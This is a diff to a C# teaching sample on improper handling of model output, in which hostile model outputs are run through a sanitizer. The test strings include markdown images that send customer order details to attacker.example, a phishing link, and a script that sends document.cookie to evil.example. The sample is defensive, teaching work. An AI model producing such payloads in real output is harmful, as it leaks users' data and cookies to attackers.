@@ -1,6 +1,6 @@
 // Chapter 13, Section 13.4: Improper output handling.
 // Runs a set of malicious and benign model outputs through AssistantOutputSanitizer (in
-// Shared/Northwind.Shared/Security) and shows what would be rendered. Needs no model.
+// Shared/Northwind.Shared/Security) and shows the safe HTML that would reach the browser. Needs no model.
 
 using Northwind.Shared.AI;
 using Northwind.Shared.Security;
@@ -15,7 +15,13 @@ var sanitizer = new AssistantOutputSanitizer(
     ("Image-based exfiltration (fetched without a click)",
      "Here is your order summary. ![tracking](https://attacker.example/collect?d=NW-10248%20Thomas%20Hardy%20London)"),
 
-    ("Raw HTML and script",
+    ("The same image in reference style, with the URL on a later line",
+     "Here is your order summary. ![tracking][1]\n\n[1]: https://attacker.example/collect?d=NW-10248%20Thomas%20Hardy%20London"),
+
+    ("A reference-style link to an unknown host (unlinked)",
+     "Please [confirm your details][verify] to finish the return.\n\n[verify]: https://attacker.example/phish"),
+
+    ("Raw HTML and script (shown as text, never run)",
      "Click <a href=\"https://evil.example\">here</a> for help. <script>fetch('https://evil.example?c='+document.cookie)</script>"),
 
     ("A link to an allowed host over HTTPS (kept)",
@@ -34,9 +40,9 @@ var sanitizer = new AssistantOutputSanitizer(
 foreach ((string description, string output) in outputs)
 {
     SampleConsole.Section(description);
-    Console.WriteLine($"model:     {output}");
-    Console.WriteLine($"rendered:  {sanitizer.Sanitize(output)}");
+    Console.WriteLine($"model:     {output.ReplaceLineEndings(" / ")}");
+    Console.WriteLine($"rendered:  {sanitizer.ToSafeHtml(output).Trim().ReplaceLineEndings(" ")}");
 }
 
-SampleConsole.Note("Regular expressions are a pragmatic first line. In production, also render Markdown with HTML " +
-                   "disabled and set a content security policy that restricts where images can be loaded from.");
+SampleConsole.Note("The sanitizer works on the parsed Markdown, so every way of writing an image or a link is checked. " +
+                   "In production, also set a content security policy that restricts where images can be loaded from.");
